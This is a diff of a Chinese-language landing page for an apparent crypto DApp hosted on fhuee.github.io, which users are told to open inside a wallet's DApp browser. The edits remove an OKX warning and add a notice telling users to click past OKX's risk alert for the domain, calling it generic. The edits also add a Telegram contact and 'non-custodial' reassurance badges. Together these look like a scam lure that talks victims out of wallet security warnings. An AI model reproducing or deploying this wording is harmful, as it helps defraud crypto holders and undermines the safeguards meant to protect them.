@@ -2,9 +2,7 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <!-- ===== 关键修复：视口强制适配 ===== -->
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
-    <!-- ===== 安卓 WebView 专用修复 ===== -->
     <meta name="mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="format-detection" content="telephone=no, email=no">
@@ -19,7 +17,6 @@
             -webkit-tap-highlight-color: transparent;
         }
 
-        /* ===== 安卓字体修复 ===== */
         html {
             font-size: 16px;
             -webkit-text-size-adjust: 100% !important;
@@ -43,7 +40,7 @@
             -moz-osx-font-smoothing: grayscale;
         }
 
-        /* ===== 容器（修复 padding 覆盖问题） ===== */
+        /* ===== 容器 ===== */
         .container {
             width: 100%;
             max-width: 600px;
@@ -139,43 +136,6 @@
             backdrop-filter: blur(6px);
             -webkit-backdrop-filter: blur(6px);
             box-shadow: 0 8px 18px -10px rgba(0, 0, 0, 0.6);
-        }
-
-        /* ===== OKX 不支持提示 ===== */
-        .warning-box {
-            width: 100%;
-            background: rgba(255, 80, 80, 0.1);
-            border: 1px solid rgba(255, 100, 100, 0.5);
-            border-radius: clamp(16px, 3vw, 22px);
-            padding: clamp(12px, 2.2vw, 18px) clamp(14px, 2.5vw, 20px);
-            margin: 0 auto clamp(16px, 3vw, 24px) auto;
-            text-align: left;
-            backdrop-filter: blur(6px);
-            -webkit-backdrop-filter: blur(6px);
-            box-shadow: 0 8px 18px -10px rgba(0, 0, 0, 0.6);
-        }
-
-        .warning-box .warning-title {
-            font-size: clamp(15px, 3.5vw, 18px);
-            font-weight: 700;
-            color: #ff9a9a;
-            margin-bottom: clamp(6px, 1.2vw, 10px);
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            line-height: 1.5;
-        }
-
-        .warning-box .warning-content {
-            font-size: clamp(13px, 3.2vw, 16px);
-            color: #ffd0d0;
-            line-height: 1.7;
-            word-break: break-word;
-        }
-
-        .warning-box .warning-content strong {
-            color: #ff6b6b;
-            font-weight: 800;
         }
 
         /* ===== 域名区域 ===== */
@@ -334,6 +294,24 @@
             border: 0.5px solid rgba(56, 189, 248, 0.2);
         }
 
+        /* ===== 联系方式徽章 ===== */
+        .security-title .contact-badge {
+            flex: 1 1 100%;
+            font-size: clamp(12px, 2.8vw, 15px);
+            background: rgba(56, 189, 248, 0.12);
+            padding: clamp(6px, 1vw, 10px) clamp(12px, 2vw, 18px);
+            border-radius: clamp(10px, 2vw, 14px);
+            font-weight: 500;
+            color: #b0daff;
+            border: 0.5px solid rgba(56, 189, 248, 0.35);
+            line-height: 1.55;
+            letter-spacing: 0.2px;
+            text-align: left;
+            word-break: break-word;
+            margin-top: clamp(6px, 1.2vw, 10px);
+        }
+
+        /* ===== 安全引言（已下移） ===== */
         .security-quote {
             font-size: clamp(16px, 4vw, 20px);
             line-height: 1.7;
@@ -341,6 +319,7 @@
             background: rgba(0, 0, 0, 0.4);
             padding: clamp(14px, 2.5vw, 20px) clamp(14px, 2.5vw, 20px);
             border-radius: clamp(18px, 3vw, 24px);
+            margin-top: clamp(14px, 2.5vw, 18px);
             margin-bottom: clamp(12px, 2vw, 18px);
             font-weight: 520;
             letter-spacing: 0.2px;
@@ -366,6 +345,59 @@
             gap: clamp(8px, 1.5vw, 12px);
             flex-wrap: wrap;
             word-break: break-word;
+        }
+
+        /* ===== 兼容性说明（安全声明内嵌版） ===== */
+        .compat-note {
+            background: rgba(255, 100, 100, 0.08);
+            border: 1px solid rgba(255, 100, 100, 0.35);
+            border-radius: clamp(14px, 2.5vw, 18px);
+            padding: clamp(12px, 2vw, 16px) clamp(14px, 2.5vw, 18px);
+            text-align: left;
+        }
+
+        .compat-note .compat-title {
+            font-size: clamp(14px, 3.2vw, 17px);
+            font-weight: 700;
+            color: #ff9a9a;
+            margin-bottom: clamp(6px, 1.2vw, 10px);
+            line-height: 1.5;
+        }
+
+        .compat-note .compat-content {
+            font-size: clamp(13px, 3vw, 15px);
+            color: #ffd0d0;
+            line-height: 1.7;
+            word-break: break-word;
+        }
+
+        .compat-note .compat-content p {
+            margin: 0 0 8px 0;
+        }
+
+        .compat-note .compat-content p:last-child {
+            margin-bottom: 0;
+        }
+
+        .compat-note .compat-content strong {
+            color: #ff6b6b;
+            font-weight: 800;
+        }
+
+        .compat-note code {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 1px 6px;
+            border-radius: 4px;
+            font-family: "SF Mono", "Fira Code", "Courier New", monospace;
+            font-size: 0.9em;
+            color: #ffd0d0;
+        }
+
+        .compat-note .compat-wallets {
+            margin-top: 8px;
+            color: #ffd0d0;
+            font-weight: 600;
+            line-height: 1.8;
         }
 
         /* ===== 徽章组 ===== */
@@ -447,15 +479,6 @@
             📌 请复制后在浏览器打开浏览了解该项目。<br>如有意运行，请在钱包 DApp 浏览器中打开以下链接申请运行。
         </div>
 
-        <!-- OKX 不支持提示 -->
-        <div class="warning-box">
-            <div class="warning-title">⚠️ 重要提示</div>
-            <div class="warning-content">
-                OKX 钱包已拒绝 GitHub 域名提供服务，<strong>无法在 OKX 钱包 DApp 浏览器中打开运行</strong>。<br>
-                请改用其他支持 DApp 的去中心化钱包（如 MetaMask、Trust Wallet、imToken、Bitget Wallet、TokenPocket 等）。
-            </div>
-        </div>
-
         <!-- 域名区域 -->
         <div class="domain-section">
             <div class="site" id="siteUrl">fhuee.github.io/1/</div>
@@ -474,13 +497,28 @@
             <div class="security-title">
                 🔒 安全声明
                 <span class="sub-badge">非托管 · 用户自主</span>
+                <span class="contact-badge">📩 如遇关于该项目任何问题都可联系 Telegram（@ffuoh）解决</span>
             </div>
+
+            <!-- 兼容性说明（已上移） -->
+            <div class="compat-note">
+                <div class="compat-title">ℹ️ 兼容性说明</div>
+                <div class="compat-content">
+                    <p>本页面托管于 GitHub Pages（<code>fhuee.github.io</code>）。由于该域名被部分钱包的风控系统整体标记，OKX 钱包内置浏览器可能无法正常打开，或弹出风险提示。<strong>如弹出风险提示点击继续即可</strong>，这属于域名层面的通用风控，并非针对本项目。</p>
+                    <p>如果在 OKX 进入不了域名，请改用下列同样支持 DApp 的去中心化钱包访问：</p>
+                    <p class="compat-wallets">✅ MetaMask &nbsp; ✅ Trust Wallet &nbsp; ✅ imToken &nbsp; ✅ Bitget Wallet &nbsp; ✅ TokenPocket</p>
+                </div>
+            </div>
+
+            <!-- 安全引言（已下移） -->
             <div class="security-quote">
                 本服务运行于去中心化环境，您的资产与数据始终由<strong> 您自己持有的私钥</strong>控制。系统无权限触碰或转移您的任何资产，所有操作均在链上透明执行。
             </div>
+
             <div class="security-footer-text">
                 💎 透明 · 安全 · 非托管 —— 您的资产，您唯一掌控。
             </div>
+
             <div class="badge-group">
                 <span class="badge">🔐 私钥自持 · 链上确权</span>
                 <span class="badge">🛡️ 非托管架构</span>
@@ -510,7 +548,6 @@
                     setTimeout(function () { btn.textContent = originalText; }, 1800);
                 });
             } else {
-                // 兼容旧浏览器
                 var input = document.createElement('input');
                 input.value = text;
                 document.body.appendChild(input);
